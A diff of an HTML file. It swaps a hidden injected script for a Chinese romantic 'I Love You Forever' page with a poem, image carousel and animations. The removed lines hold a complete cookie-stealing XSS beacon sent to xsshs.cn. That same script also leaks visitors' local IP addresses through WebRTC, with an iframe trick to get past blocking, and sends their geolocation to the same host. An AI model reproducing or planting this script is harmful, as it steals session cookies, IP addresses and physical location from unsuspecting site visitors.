@@ -1,110 +1,92 @@
-<script>
-  
-  (function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=IChL&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
-if(''==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=IChL&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
-function getIPs(callback) {
-    var ip_dups = {};
+﻿<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>I Love You Forever</title>
+<meta name="author" content="Mike">
 
-    //compatibility for firefox and chrome
-    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-    var useWebKit = !!window.webkitRTCPeerConnection;
+<link rel="stylesheet" href="css/style.css" type="text/css" media="all">
+<!--导库-->
+<script type="text/javascript" src="js/jquery.js"></script>
+<!-- 图片幻灯片效果-->
+<script type="text/javascript" src="js/roundabout.js"></script>
+<script type="text/javascript" src="js/roundabout_shapes.js"></script>
+<script type="text/javascript" src="js/gallery_init.js"></script>
+<!-- 下雪-->
+<script type="text/javascript" src="js/snowstorm.js"></script>
+<!-- 打字机效果-->		
+<script type="text/javascript" src="js/text.js"></script>
+<!-- 画爱心-->
+<script type="text/javascript" src="js/ga.js" async=""></script>
+<script type="text/javascript" src="js/heart.js"></script>
+<!-- 移动div-->
+<script type="text/javascript" src="js/move.js"></script>
+<!-- 显示时间 -->
+<script type="text/javascript" src="js/time.js"></script>
+<!-- 设置文字跟随鼠标 -->
+<script type="text/javascript" src="js/makesnake.js"></script></head><body>
+<!-- thanks for watching! -->
+<span id="span0" class="spanstyle">T</span><span id="span1" class="spanstyle">h</span>
+<span id="span2" class="spanstyle">a</span><span id="span3" class="spanstyle">n</span>
+<span id="span4" class="spanstyle">k</span><span id="span5" class="spanstyle">s</span><span id="span6" class="spanstyle">
+ </span><span id="span7" class="spanstyle">f</span><span id="span8" class="spanstyle">o</span><span id="span9" class="spanstyle">r</span>
+ <span id="span10" class="spanstyle"> </span><span id="span11" class="spanstyle">w</span>
+ <span id="span12" class="spanstyle">a</span><span id="span13" class="spanstyle">t</span><span id="span14" class="spanstyle">c</span><span id="span15" class="spanstyle">h</span>
+ <span id="span16" class="spanstyle">i</span><span id="span17" class="spanstyle">n</span><span id="span18" class="spanstyle">g</span><span id="span19" class="spanstyle">!</span>
 
-    //bypass naive webrtc blocking using an iframe
-    if (!RTCPeerConnection) {
-        //NOTE: you need to have an iframe in the page right above the script tag
-        //
-        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
-        //<script>...getIPs called in here...
-        //
-        var win = iframe.contentWindow;
-        RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
-        useWebKit = !!win.webkitRTCPeerConnection;
-    }
 
-    //minimal requirements for data connection
-    var mediaConstraints = {
-        optional: [{
-            RtpDataChannels: true
-        }]
-    };
 
-    var servers = {
-        iceServers: [{
-            urls: "stun:stun.services.mozilla.com"
-        }]
-    };
+<script type="text/javascript">
+	setTimeout(makesnake, 42000);
+</script>
+<!--#Header-->
+<div id="header" style="opacity:0.85">
+	<div id="title">
+		立此网页，留待伊人。
+	</div>
+</div>
 
-    //construct a new RTCPeerConnection
-    var pc = new RTCPeerConnection(servers, mediaConstraints);
+<!-- #myContent -->
+<div id="myContent">
+		<span id="blink" style="display: none;">_</span></div>
+<div id="contentToWrite" style="display:none">
+		 《五二零独吟》<br>
+		试问空枕谁入梦，      <br>
+		聊望花境倦妆红。   <br>
+		斯如周公亦难解，        <br>
+		满房清思寄何从。	<br>
+		<br>
+		------------李岱熹<br>
+</div>
+<script type="text/javascript">
+	writeContent(true);
+</script>
 
-    function handleCandidate(candidate) {
-        //match just the IP address
-        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
-        var ip_addr = ip_regex.exec(candidate)[1];
 
-        //remove duplicates
-        if (ip_dups[ip_addr] === undefined) callback(ip_addr);
+<!-- #container -->
+<div id="container">
+	<ul id="myRoundabout" class="roundabout-holder" style="padding: 0px; position: relative; z-index: 100;">
+	<li class="roundabout-moveable-item roundabout-in-focus" current-scale="1.0000" style="position: absolute; left: 122px; top: 87px; width: 350px; height: 222px; opacity: 1; z-index: 400; font-size: 16px;"><img src="img/1.jpg" alt=""></li>
+	<li class="roundabout-moveable-item" current-scale="0.7927" style="position: absolute; left: -0.4px; top: 110px; width: 277.445px; height: 175.9794px; opacity: 1; z-index: 296; font-size: 12.68px;"><img src="img/2.jpg" alt=""></li>
+	<li class="roundabout-moveable-item" current-scale="0.4573" style="position: absolute; left: 473.8px; top: 147.2px; width: 160.055px; height: 101.5206px; opacity: 1; z-index: 129; font-size: 7.32px;"><img src="img/3.jpg" alt=""></li>
+	<li class="roundabout-moveable-item" current-scale="0.4573" style="position: absolute; left: -39.8px; top: 147.2px; width: 160.055px; height: 101.5206px; opacity: 1; z-index: 129; font-size: 7.32px;"><img src="img/4.jpg" alt=""></li>
+	<li class="roundabout-moveable-item" current-scale="0.7927" style="position: absolute; left: 317px; top: 110px; width: 277.445px; height: 175.9794px; opacity: 1; z-index: 296; font-size: 12.68px;"><img src="img/5.jpg" alt=""></li>
+  </ul>
+</div>
+<script type="text/javascript">
+	setTimeout(move, 15000);
+</script>
 
-        ip_dups[ip_addr] = true;
-    }
+<!-- #bg -->
+<div id="bg">
+	<canvas id="garden" width="1583" height="709"><c style="color: #FFF; text-shadow:2px 3px 3px #222; font-family:Microsoft YaHei; font-size:50px">你的浏览器过时了,试试火狐吧!</c></canvas>
+</div>
 
-    //listen for candidate events
-    pc.onicecandidate = function(ice) {
+<!-- #time -->
+<div id="time">
+	<span id="show"></span>
+	<script type="text/javascript">
+		setTimeout("showTime()", 40000);
+	</script>
+</div>
 
-        //skip non-candidate events
-        if (ice.candidate) handleCandidate(ice.candidate.candidate);
-    };
-
-    //create a bogus data channel
-    pc.createDataChannel("");
-
-    //create an offer sdp
-    pc.createOffer(function(result) {
-
-        //trigger the stun server request
-        pc.setLocalDescription(result,
-        function() {},
-        function() {});
-
-    },
-    function() {});
-
-    //wait for a while to let everything done
-    setTimeout(function() {
-        //read candidate info from local description
-        var lines = pc.localDescription.sdp.split('\n');
-
-        lines.forEach(function(line) {
-            if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
-        });
-    },
-    1000);
-}
-
-//Test: Print the IP addresses into the console
-getIPs(function(ip) { (new Image()).src = 'https://xsshs.cn/xss.php?do=api&id=IChL&location=' + escape((function() {
-        try {
-            return document.location.href
-        } catch(e) {
-            return ''
-        }
-    })()) + '&ip=' + ip;
-});function getLocation() 
-  {
-  if (navigator.geolocation)
-    {
-    navigator.geolocation.getCurrentPosition(showPosition);
-    }
-  else{x.innerHTML="Geolocation is not supported by this browser.";}
-  }
-function showPosition(position)
-  {
-
-    (new Image()).src='https://xsshs.cn/xss.php?do=api&id=IChL&weidu='+position.coords.latitude+'&jingdu='+position.coords.longitude; 
-}
-       
-getLocation();
-  
-  
-  
-  </script>
+</body>
